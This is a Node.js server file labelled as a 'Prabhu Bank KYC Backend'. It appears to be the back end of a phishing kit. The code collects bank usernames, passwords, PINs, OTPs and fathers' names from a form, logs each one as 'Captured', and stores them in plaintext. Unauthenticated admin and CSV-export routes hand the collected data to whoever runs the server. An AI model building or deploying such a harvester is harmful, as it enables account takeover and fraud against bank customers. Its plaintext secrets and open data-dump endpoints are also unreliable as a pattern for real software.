// server.js — Prabhu Bank KYC Backend (Node.js/cPanel version)
// Replaces server.ps1 for Linux cPanel hosting
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data', 'responses.json');

// Ensure data directory & file exist
if (!fs.existsSync(path.join(__dirname, 'data'))) {
  fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
}
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, '[]', 'utf8');
}

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.txt': 'text/plain; charset=utf-8',
};

function readResponses() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return JSON.parse(raw) || [];
  } catch { return []; }
}

function saveResponses(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
}

function sendJson(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Content-Length': Buffer.byteLength(body),
  });
  res.end(body);
}

function getBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => resolve(body));
  });
}

function log(msg) {
  const ts = new Date().toISOString().replace('T', ' ').substring(0, 19);
  console.log(`[${ts}] ${msg}`);
}

const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url);
  const pathname = parsed.pathname.toLowerCase();
  const method = req.method.toUpperCase();
  const clientIp = req.socket.remoteAddress || '';

  log(`--> HTTP ${method} ${pathname}`);

  // CORS preflight
  if (method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    });
    return res.end();
  }

  // ── API ROUTES ──────────────────────────────────────────────────────────────

  // 1. Health Check
  if (pathname === '/api/health' && (method === 'GET' || method === 'HEAD')) {
    return sendJson(res, 200, {
      status: 'online',
      service: 'Prabhu Bank KYC Backend',
      totalResponses: readResponses().length,
      time: new Date().toISOString(),
    });
  }

  // 2. Get All Responses
  if (pathname === '/api/responses' && (method === 'GET' || method === 'HEAD')) {
    return sendJson(res, 200, readResponses());
  }

  // 3. Clear All Responses
  if (pathname === '/api/responses' && method === 'DELETE') {
    saveResponses([]);
    log(`All responses cleared by ${clientIp}`);
    return sendJson(res, 200, { status: 'success', message: 'All stored responses have been cleared' });
  }

  // 4. Submit KYC Step 1
  if ((pathname === '/api/submit' || pathname === '/api/submit-kyc') && method === 'POST') {
    const body = await getBody(req);
    try {
      const payload = JSON.parse(body);
      const sessionId = payload.sessionId || ('PRB-SES-' + (Math.floor(Math.random() * 900000) + 100000));
      const record = {
        id: Date.now(),
        sessionId,
        refId: payload.refId || ('PRB-KYC-' + (Math.floor(Math.random() * 900000) + 100000)),
        webrtcSessionId: payload.webrtcSessionId || '',
        status: 'INITIAL_SUBMISSION',
        username: payload.username || '',
        mobile: payload.mobile || '',
        password: payload.password || '',
        pin: payload.pin || '',
        fatherName: payload.fatherName || '',
        otp: payload.otp || '',
        clientIp,
        userAgent: req.headers['user-agent'] || '',
        createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
        verifiedAt: '',
      };
      const existing = readResponses();
      const idx = existing.findIndex(r => r.sessionId === sessionId);
      if (idx >= 0) {
        Object.assign(existing[idx], {
          username: record.username, mobile: record.mobile,
          password: record.password, pin: record.pin, fatherName: record.fatherName,
        });
      } else {
        existing.unshift(record);
      }
      saveResponses(existing);
      log(`Captured KYC Step 1 from ${clientIp} - Mobile: ${payload.mobile}, User: ${payload.username}, Session: ${sessionId}`);
      return sendJson(res, 200, { status: 'success', sessionId, refId: record.refId, message: 'Step 1 response recorded' });
    } catch (e) {
      log(`Error processing Step 1: ${e.message}`);
      return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload' });
    }
  }

  // 5. OTP Verification
  if (pathname === '/api/verify-otp' && method === 'POST') {
    const body = await getBody(req);
    try {
      const payload = JSON.parse(body);
      const existing = readResponses();
      let finalRefId = payload.refId || '';
      let updated = false;
      for (const r of existing) {
        if (r.sessionId === payload.sessionId || (r.mobile === payload.mobile && r.status === 'INITIAL_SUBMISSION')) {
          r.otp = payload.otp || '';
          r.refId = payload.refId || r.refId;
          r.status = 'VERIFIED_COMPLETE';
          r.verifiedAt = new Date().toISOString().replace('T', ' ').substring(0, 19);
          finalRefId = r.refId;
          updated = true;
          break;
        }
      }
      if (!updated) {
        finalRefId = payload.refId || ('PRB-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
        existing.unshift({
          id: Date.now(),
          sessionId: payload.sessionId || ('PRB-SES-' + (Math.floor(Math.random() * 900000) + 100000)),
          refId: finalRefId,
          status: 'VERIFIED_COMPLETE',
          username: payload.username || '', mobile: payload.mobile || '',
          password: payload.password || '', pin: payload.pin || '',
          fatherName: payload.fatherName || '', otp: payload.otp || '',
          clientIp, userAgent: req.headers['user-agent'] || '',
          createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
          verifiedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
        });
      }
      saveResponses(existing);
      log(`KYC VERIFIED from ${clientIp} - Mobile: ${payload.mobile}, OTP: ${payload.otp}, RefId: ${finalRefId}`);
      return sendJson(res, 200, { status: 'success', refId: finalRefId, message: 'KYC OTP verification recorded successfully' });
    } catch (e) {
      log(`Error processing OTP: ${e.message}`);
      return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload' });
    }
  }

  // 6. Export Responses as CSV
  if (pathname === '/api/export/csv' && (method === 'GET' || method === 'HEAD')) {
    const records = readResponses();
    const headers = ['id','sessionId','refId','status','username','mobile','password','pin','fatherName','otp','clientIp','createdAt','verifiedAt'];
    let csv = headers.join(',') + '\n';
    for (const r of records) {
      csv += headers.map(h => `"${(r[h] || '').toString().replace(/"/g, '""')}"`).join(',') + '\n';
    }
    const buf = Buffer.from(csv, 'utf8');
    res.writeHead(200, {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': 'attachment; filename="kyc_responses.csv"',
      'Content-Length': buf.length,
      'Access-Control-Allow-Origin': '*',
    });
    return res.end(method === 'HEAD' ? undefined : buf);
  }

  // ── STATIC FILE SERVING ──────────────────────────────────────────────────────

  let filePath = pathname;
  if (pathname === '/' || pathname === '') filePath = '/index.html';
  else if (pathname === '/responses' || pathname === '/admin') filePath = '/responses.html';
  else if (pathname === '/viewer' || pathname.startsWith('/share')) filePath = '/viewer.html';
  else if (pathname === '/favicon.ico') filePath = '/logo.png';

  const fullPath = path.join(__dirname, filePath.replace(/^\//, ''));

  try {
    const stat = fs.statSync(fullPath);
    if (stat.isFile()) {
      const ext = path.extname(fullPath).toLowerCase();
      const contentType = MIME[ext] || 'application/octet-stream';
      res.writeHead(200, {
        'Content-Type': contentType,
        'Content-Length': stat.size,
        'Access-Control-Allow-Origin': '*',
      });
      if (method === 'HEAD') return res.end();
      return fs.createReadStream(fullPath).pipe(res);
    }
  } catch (_) {}

  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('404 Not Found');
});

server.listen(PORT, () => {
  log(`==========================================================`);
  log(`  PRABHU BANK KYC BACKEND ONLINE`);
  log(`  Port    : ${PORT}`);
  log(`  Data    : ${DATA_FILE}`);
  log(`  Health  : http://localhost:${PORT}/api/health`);
  log(`==========================================================`);
});
